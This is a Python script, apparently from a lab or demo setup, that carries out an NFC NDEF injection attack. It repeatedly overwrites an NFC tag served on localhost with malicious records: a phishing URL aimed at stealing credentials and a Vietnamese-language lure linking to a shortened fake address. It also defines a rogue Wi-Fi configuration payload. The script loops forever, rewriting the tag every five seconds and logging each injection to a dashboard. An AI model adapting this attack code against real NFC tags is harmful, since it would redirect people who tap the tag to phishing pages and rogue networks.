#!/usr/bin/env python3
import socket, json
import time
import ndef
from colorama import Fore, init
import requests
from datetime import datetime

init(autoreset=True)

NFC_HOST = '127.0.0.1'
NFC_PORT = 6011

PAYLOADS = {
    'phishing_url': ('URI', 'https://evil.attacker.com/steal-credentials'),
    'fake_wifi': (
        'MIME',
        'application/vnd.wfa.wsc',
        b'\x10\x26\x00\x01\x01\x10\x45\x00\x0cFakeHotspot\x10\x27\x00\x08password'
    ),
    'malicious_text': ('TEXT', 'He thong da cap nhat. Truy cap: bit.ly/fake'),
}

def send_to_dashboard(proto, msg, cls):
    try:
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        requests.post('http://127.0.0.1:8080/api/log', json={
            't': now, 'proto': proto, 'msg': msg, 'cls': cls
        }, timeout=0.5)
    except:
        pass

def make_payload(ptype: str) -> bytes:
    if ptype == 'phishing_url':
        r = ndef.UriRecord(PAYLOADS['phishing_url'][1])
    elif ptype == 'malicious_text':
        r = ndef.TextRecord(PAYLOADS['malicious_text'][1])
    else:
        r = ndef.UriRecord('https://evil.example.com')
    return b''.join(ndef.message_encoder([r]))

def inject(ptype: str):
    ndef_bytes = make_payload(ptype)
    send_to_dashboard('NFC', f'NDEF INJECTED payload: {ptype}', 'INJECT')
    s = socket.socket()
    s.settimeout(3)
    s.connect((NFC_HOST, NFC_PORT))
    payload = {'cmd': 'WRITE_NDEF', 'ndef_hex': ndef_bytes.hex()}
    s.send(json.dumps(payload).encode())
    resp = json.loads(s.recv(512).decode())
    s.close()
    return resp

print(f'{Fore.RED}=== NFC NDEF Injection Attack ===\n')
for ptype in ['phishing_url', 'malicious_text']:
    print(f'{Fore.RED}[INJECT] Overwriting with: {ptype}')
    r = inject(ptype)
    print(f'{Fore.RED}[INJECT] Result: {r}')
    s = socket.socket()
    s.settimeout(2)
    s.connect((NFC_HOST, NFC_PORT))
    s.send(json.dumps({'cmd': 'READ_NDEF'}).encode())
    verify = json.loads(s.recv(2048).decode())
    s.close()
    print(f'{Fore.RED}[VERIFY] New NDEF: {verify["records"]}\n')

print(f'{Fore.RED}=== NFC NDEF Injection Attack ===\n')

while True:  # Thêm vòng lặp vô hạn
    for ptype in ['phishing_url', 'malicious_text']:
        print(f'{Fore.RED}[INJECT] Overwriting with: {ptype}')
        x = inject(ptype)
        print(f'{Fore.RED}[INJECT] Result: {x}')
        
        # Xác minh: đọc lại tag
        s = socket.socket(); s.settimeout(2)
        s.connect((NFC_HOST, NFC_PORT))
        s.send(json.dumps({'cmd': 'READ_NDEF'}).encode())
        verify = json.loads(s.recv(2048).decode()); s.close()
        print(f'{Fore.RED}[VERIFY] New NDEF: {verify["records"]}\n')
        
    print("Đang đợi 5 giây để ghi đè tiếp...")
    time.sleep(5)